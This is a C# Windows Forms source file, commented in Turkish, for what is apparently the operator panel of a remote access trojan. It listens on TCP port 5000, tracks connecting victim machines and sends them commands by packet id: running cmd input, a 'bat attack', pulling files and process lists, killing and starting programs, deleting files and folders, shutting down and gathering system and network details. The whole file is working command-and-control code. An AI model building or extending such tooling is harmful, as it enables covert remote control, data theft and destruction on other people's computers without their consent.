    using Microsoft.VisualBasic.Logging;
    using Newtonsoft.Json;
    using System;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.Data;
    using System.Data.Common;
    using System.Drawing;
    using System.Linq;
    using System.Net;
    using System.Net.Sockets;
using System.Reflection.Metadata;
    using System.Text;
    using System.Threading;
    using System.Threading.Tasks;
    using System.Windows.Forms;
using System.Media;
using Timer = System.Windows.Forms.Timer;

namespace adminpanel
    {
    public partial class YonetimPaneli : Form
    {
        TcpListener listener;
        List<TcpClient> baglananclient = new List<TcpClient>();
        public YonetimPaneli()
        {
            InitializeComponent();
            ustpnl.MouseDown += new MouseEventHandler(Form_MouseDown);
            ustpnl.MouseMove += new MouseEventHandler(Form_MouseMove);
            ustpnl.MouseUp += new MouseEventHandler(Form_MouseUp);
        }



        private void YonetimPaneli_Load(object sender, EventArgs e)
        {
            Thread serverThread = new Thread(StartServer);
            serverThread.IsBackground = true;
            serverThread.Start();
            komutcb.Items.AddRange(new object[]
           {
                "MessageBox",
                 "Shutdown",
               "GetSystemInfo",
               "cmd",
               "bat saldırısı",
               "sistem bilgisi",
               "dosya çek",
               "procces çek",
               "uygulama kapat",
               "uygulama başlat",
               "dosya oluştur",
               "dosya sil",
               "klasör sil",
                "ağ bağlantılarını al"
              });
            saldırısendbtn.FlatAppearance.BorderSize = 1;
            saldırısendbtn.FlatAppearance.BorderColor = Color.Lime;


            /* System.Windows.Forms.Timer pingTimer = new System.Windows.Forms.Timer();
             pingTimer.Interval = 10000; // 10 saniye
             pingTimer.Tick += (s, ev) => Pingclient();
             pingTimer.Start();*/

        }
        int Port = 5000;
        string Versiyon = "0.2"; // program sürümü
        void StartServer()
        {
            listener = new TcpListener(IPAddress.Any, Port); // 5000 portunu dinle ve tüm gelen istekleri kabul et
            listener.Start();
            Invoke((MethodInvoker)(() => logtb.AppendText($"[+] Sunucu başlatıldı: {Port}\n")));


            while (true)
            {
                TcpClient istemci = listener.AcceptTcpClient(); // bağlantıyı kabul et
                baglananclient.Add(istemci);// listeye ekle

                string istemciIp = ((IPEndPoint)istemci.Client.RemoteEndPoint).ToString(); // istemciden gelen ip'yi stringe çevir
                Invoke((MethodInvoker)(() =>
                {
                    clientlb.Items.Add(istemciIp); // listbox'a ekle
                    ModalGoster($"Yeni bağlantı:{istemciIp}");
                    logtb.AppendText("[+] Yeni bağlantı: " + istemciIp + "\n"); // logda görüntüle(bunu yapmamışmıydık zaten?!
                }));
                Thread clientThread = new Thread(() => HandleClient(istemci));
                clientThread.IsBackground = true;
                clientThread.Start();

            }

        }
        //----- Packet id system--------
        void HandleClient(TcpClient client)
        {
            NetworkStream ns = client.GetStream();
            byte[] buffer = new byte[4096]; // max veri boyutu
            string ip = ((IPEndPoint)client.Client.RemoteEndPoint).ToString();

    

            try
            {
                while (true)
                {
                    int byteCount = ns.Read(buffer, 0, buffer.Length);
                    if (byteCount <= 4) break; // 4 bytendan az ise paket id bile yok
                    int paketid = BitConverter.ToInt32(buffer, 0); //ilk 4'ü paketid
                    string mesaj = Encoding.UTF8.GetString(buffer, 4, byteCount - 4); // 4. byte'dan başla gerisi string verisi
                  //  Console.WriteLine($"yeni mesaj: {mesaj}- {paketid}");

                    switch (paketid)
                    {
                        case 10000:
                            this.Invoke((MethodInvoker)(() =>
                            {
                                ModalGoster(mesaj);
                                logtb.AppendText($"hata: {mesaj}");         
                            }));
                            break;
                        case 10001: //??!
                            break;
                        case 10002:
                            if (Versiyon == mesaj)
                            {
                                Invoke((MethodInvoker)(() =>
                                {
                                    logtb.AppendText($"doğru sürüm geldi\n");
                                }));

                            }
                            else Invoke((MethodInvoker)(() =>
                            {
                                ModalGoster($"sürümler uyuşmadı... {Versiyon}\n");
                            }));
                            break;
                        case 10003:
                            Invoke((MethodInvoker)(() => logtb.AppendText($"konsol çıktısı: {mesaj}\n")));
                            break;
                        case 10004:
                            Invoke((MethodInvoker)(() => logtb.AppendText($"sistem: {mesaj}\n")));
                          
                            break;
                        case 10005:
                        
                            Invoke((MethodInvoker)(() =>
                            {
                                for (int i = 0; i < clientlb.Items.Count; i++)
                                {
                                    string itemText = clientlb.Items[i].ToString();
                                    if (itemText.StartsWith(ip))
                                    {
                                        clientlb.Items[i] = $"{ip} - {mesaj}";
                                        return;
                                    }
                                }

                                // Eğer bulamazsa yeni ekle
                                clientlb.Items.Add($"{ip} - {mesaj}");
                            }));
                            break;
                        case 10006:
                            Dosyayoneticisi dosyaForm = new Dosyayoneticisi(client, ip, mesaj);
                            dosyaForm.ShowDialog();
                            break;
                        case 10007:
                            // MessageBox.Show(mesaj);
                            Dosyayoneticisi dosyaForms = new Dosyayoneticisi(client, ip, mesaj);
                            dosyaForms.ShowDialog();
                            break;
                        case 10008:
                            this.Invoke((MethodInvoker)(() =>
                            {
                                logtb.AppendText($"[Ağ] {mesaj}\n");
                                ModalGoster($"Ağ bilgisi: \n{mesaj}");
                            }));

                            break;


                        default:
                            ModalGoster($"geçersiz paket id: {paketid}");
                            this.Invoke((MethodInvoker)(() =>
                            {
                                logtb.AppendText($"[PAKET HATASI]: geçersiz paket hatası {paketid}\n");
                            }));
                            break;




                    }
                }
            }
            catch (Exception ex)
            {
                client.Close();
                baglananclient.Remove(client);
                string hataMesajı = "[!] Hata (HandleClient): " + ex.Message;

                Invoke((MethodInvoker)(() =>
                {
                    // IP ile başlayan satırı bul
                    for (int i = 0; i < clientlb.Items.Count; i++)
                    {
                        string item = clientlb.Items[i].ToString();
                        if (item.StartsWith(ip))
                        {
                            clientlb.Items.RemoveAt(i);
                            break;
                        }
                    }

                    logtb.AppendText($"[-](handle client) Bağlantı kesildi: {ip} \n hata: {ex.Message}\n");

                    // Modal gösterimi burada güvenli hale getir
                    ModalGoster(hataMesajı);
                }));
            }



        }

        private void saldırısendbtn_Click(object sender, EventArgs e)
        {
           


            if (clientlb.SelectedIndex == -1)
            {
                ModalGoster("istemci'yi seçiniz");
                return; // işlem tamamlandı olarak döndür
            }
            if (string.IsNullOrEmpty(komutcb.Text))
            {
                ModalGoster("komut seçiniz");
                return;
            }
            if (string.IsNullOrEmpty(mesajtb.Text))
            {
                ModalGoster("boş mesaj gönderilemez!!!");
                return;
            }
            string secilenip = clientlb.SelectedItem.ToString().Split('-')[0].Trim();
            string komut = komutcb.Text;
            string mesaj = mesajtb.Text;
          

            


            // ip'yi eşle
            TcpClient hedefistemci = baglananclient.FirstOrDefault(c => ((IPEndPoint)c.Client.RemoteEndPoint).ToString() == secilenip);

            if (hedefistemci != null && hedefistemci.Connected) // istemci bağlıysa ve boş değilse
            {
                try
                {
                    NetworkStream ns = hedefistemci.GetStream();

                    switch (komut)
                    {
                        case "MessageBox":
                            PaketGonder(ns, 20000, mesaj);
                            break;
                        case "cmd":
                            PaketGonder(ns, 20001, mesaj);
                            break;
                        case "bat saldırısı":
                            PaketGonder(ns, 20003, mesaj);
                            break;
                        case "sistem bilgisi":
                            PaketGonder(ns, 20004, mesaj);
                            break;
                        case "dosya çek":
                            PaketGonder(ns, 20005, mesaj);
                            break;
                        case "procces çek":
                            PaketGonder(ns, 20006, mesaj); // boş mesaj gönderme!!!!
                            break;
                        case "uygulama kapat":
                            PaketGonder(ns, 20007, mesaj);
                            break;
                        case "uygulama başlat":
                            PaketGonder(ns, 20008, mesaj);
                            break;
                        case "dosya oluştur":
                            PaketGonder(ns, 20009, mesaj);
                            break;
                        case "dosya sil":
                            if(!mesaj.Contains("."))
                            {
                                ModalGoster("uzantı eklenmek zorunda");
                                return;
                            }
                            PaketGonder(ns,20010, mesaj);
                            break;
                        case "klasör sil":
                            PaketGonder(ns, 20011, mesaj);
                            break;
                        case "ağ bağlantılarını al":
                            PaketGonder(ns, 20012, mesaj);
                            break;
                        default:
                            ModalGoster("geçerszi gönderim");
                            break;


                    }


                    //logtb.Clear();
                    logtb.AppendText($"[>] '{secilenip}' istemcisine '{komut}' komutu gönderildi.\n");
                }
                catch (Exception ex)
                {

                    ModalGoster("[-] hata :" + ex.ToString());
                    Console.WriteLine("[-] hata :" + ex.ToString());
                }
            }
        }
        void PaketGonder(NetworkStream ns, int paketid, string mesaj)
        {
            byte[] idBytes = BitConverter.GetBytes(paketid);
            byte[] mesajByte = Encoding.UTF8.GetBytes(mesaj);
            byte[] finalPaket = new byte[idBytes.Length + mesajByte.Length];
            Array.Copy(idBytes, 0, finalPaket, 0, idBytes.Length);
            Array.Copy(mesajByte, 0, finalPaket, idBytes.Length, mesajByte.Length);
            ns.Write(finalPaket, 0, finalPaket.Length);
        }

        private void bağlantıyıKesToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (clientlb.SelectedIndex == -1)
            {
                ModalGoster("lütfen bir istemci seçin");
                return;
            }
            string secilenip = clientlb.SelectedItem.ToString().Split('-')[0].Trim(); //porno
            string secilensatır = clientlb.SelectedItem.ToString();

            TcpClient hedef = baglananclient.FirstOrDefault(c =>
                ((IPEndPoint)c.Client.RemoteEndPoint).ToString() == secilenip);


            if (hedef != null)
            {
                try
                {
                    hedef.Close();

                }
                catch (Exception ex)
                {
                   ModalGoster("hata: " + ex.Message);
                    baglananclient.Remove(hedef);
                    clientlb.Items.Remove(secilensatır);
                    logtb.AppendText($"{hedef} istemci ({secilenip}'nin bağlantısı başarılı şekilde kesildi\n");
                }
               
            }
        }

        private Point mouseOffset;
        private bool isMouseDown = false;
        private void Form_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                mouseOffset = new Point(e.X, e.Y);
                isMouseDown = true;
            }
        }

        private void Form_MouseMove(object sender, MouseEventArgs e)
        {
            if (isMouseDown)
            {
                Point currentScreenPos = PointToScreen(e.Location);
                this.Location = new Point(currentScreenPos.X - mouseOffset.X, currentScreenPos.Y - mouseOffset.Y);
            }
        }

        private void Form_MouseUp(object sender, MouseEventArgs e)
        {
            isMouseDown = false;
        }

        private void kptbtn_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void kucultbtn_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void saldırısendbtn_MouseEnter(object sender, EventArgs e)
        {

            saldırısendbtn.BackColor = Color.FromArgb(0, 180, 0); // koyu neon yeşil
            saldırısendbtn.ForeColor = Color.Black;
            saldırısendbtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 255, 100);  // hover'da parlama gibi

        }

        private void saldırısendbtn_MouseLeave(object sender, EventArgs e)
        {
            saldırısendbtn.BackColor = Color.FromArgb(18, 18, 18);
            saldırısendbtn.ForeColor = Color.Lime;
        }
        private void ModalGoster(string mesaj)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => ModalGoster(mesaj)));
                return;
            }

            // Sesi çal
            try
            {
                System.Media.SoundPlayer sp = new System.Media.SoundPlayer(@"C:\Users\arda64\Downloads\ses.wav");
                sp.Play();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Ses çalınamadı: " + ex.Message);
            }

            Panel popupPanel = new Panel();
            popupPanel.Size = new Size(250, 100);
            popupPanel.BackColor = Color.FromArgb(18, 18, 18);
            popupPanel.BorderStyle = BorderStyle.FixedSingle;
            popupPanel.Location = new Point((this.Width - popupPanel.Width) / 2, (this.Height - popupPanel.Height) / 2 - 100); // 100px yukarı
            popupPanel.Anchor = AnchorStyles.None;
            popupPanel.BringToFront();
            popupPanel.Visible = true;

            // Çizgi paneli - soldan sağa doğru küçülecek
            Panel bar = new Panel();
            bar.Height = 2;
            bar.Width = 250;
            bar.BackColor = Color.White;
            bar.Top = 0;
            bar.Left = 0; // Sol kenarda başlasın
            popupPanel.Controls.Add(bar);

            // Mesaj
            Label lbl = new Label();
            lbl.Text = mesaj;
            lbl.ForeColor = Color.Lime;
            lbl.Font = new Font("Consolas", 10, FontStyle.Bold);
            lbl.Dock = DockStyle.Fill;
            lbl.TextAlign = ContentAlignment.MiddleCenter;
            popupPanel.Controls.Add(lbl);




            this.Controls.Add(popupPanel);
            popupPanel.BringToFront();

            // Geri sayım: sağ ucu çekilecek
            Timer timer = new Timer();
            timer.Interval = 65;

            int remainingWidth = bar.Width;

            timer.Tick += (s, e) =>
            {
                if (remainingWidth <= 0)
                {
                    timer.Stop();
                    this.Controls.Remove(popupPanel);
                }
                else
                {
                    remainingWidth -= 5;
                    bar.Width = remainingWidth;
                    // Left değişmiyor → sol sabit, sağ küçülüyor
                }
            };

            timer.Start();
            

        }








    }


}

